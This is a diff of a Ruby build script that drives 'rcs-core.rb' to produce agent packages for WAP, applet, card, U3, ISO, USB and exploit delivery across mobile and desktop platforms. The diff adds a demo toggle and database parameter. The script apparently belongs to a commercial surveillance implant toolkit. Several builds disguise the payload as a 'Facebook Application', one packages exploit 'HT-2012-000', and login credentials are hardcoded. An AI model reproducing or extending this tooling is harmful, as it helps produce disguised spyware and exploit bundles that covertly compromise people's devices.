@@ -4,12 +4,16 @@ require 'json'
 USER = 'alor'
 PASS = 'demorcss'
 FACTORY = 'RCS_0000000001'
+DB = 'rcs-castore'
+DEMO = true
+
+ver = DEMO ? '_demo' : ''
 
 puts "Building all complex..."
 ###################################################################################################
 params = {platform: 'wap',
           generate: {platforms: ['blackberry', 'android', 'winmo'],
-                     binary: {demo: true, admin: true},
+                     binary: {demo: DEMO, admin: true},
                      melt: {admin: true,
                             appname: 'facebook',
                             name: 'Facebook Application',
@@ -21,60 +25,60 @@ params = {platform: 'wap',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o wap.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
 ###################################################################################################
 params = {platform: 'applet',
           generate: {platforms: ['osx', 'windows'],
-                     binary: {demo: true, admin: false},
+                     binary: {demo: DEMO, admin: false},
                      melt: {admin: false}
                     },
           melt: {appname: 'facebook'}
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o applet.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o applet#{ver}.zip"
 ###################################################################################################
 params = {platform: 'card',
           generate: {platforms: ['winmo'],
-                     binary: {demo: true}
+                     binary: {demo: DEMO}
                     }
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o card.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o card#{ver}.zip"
 ###################################################################################################
 params = {platform: 'u3',
           generate: {platforms: ['windows'],
-                     binary: {demo: true},
+                     binary: {demo: DEMO},
                      melt: {admin: false}
                     }
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o u3.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o u3#{ver}.zip"
 ###################################################################################################
 params = {platform: 'iso',
           generate: {platforms: ['osx', 'windows'],
-                     binary: {demo: true}
+                     binary: {demo: DEMO}
                     }
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o iso.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o offline#{ver}.zip"
 ###################################################################################################
 params = {platform: 'usb',
-          generate: {binary: {demo: true, admin: false},
+          generate: {binary: {demo: DEMO, admin: false},
                      melt: {admin: false}
                     }
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o usb.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o usb#{ver}.zip"
 ###################################################################################################
 params = {platform: 'exploit',
           generate: {exploit: 'HT-2012-000',
                      platforms: ['osx', 'windows'],
-                     binary: {demo: true, admin: false},
+                     binary: {demo: DEMO, admin: false},
                      melt: {admin: false}
                     },
           melt: {appname: 'facebook',
@@ -82,6 +86,6 @@ params = {platform: 'exploit',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o exploit.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o exploit#{ver}.zip"
 ###################################################################################################
 puts "End"
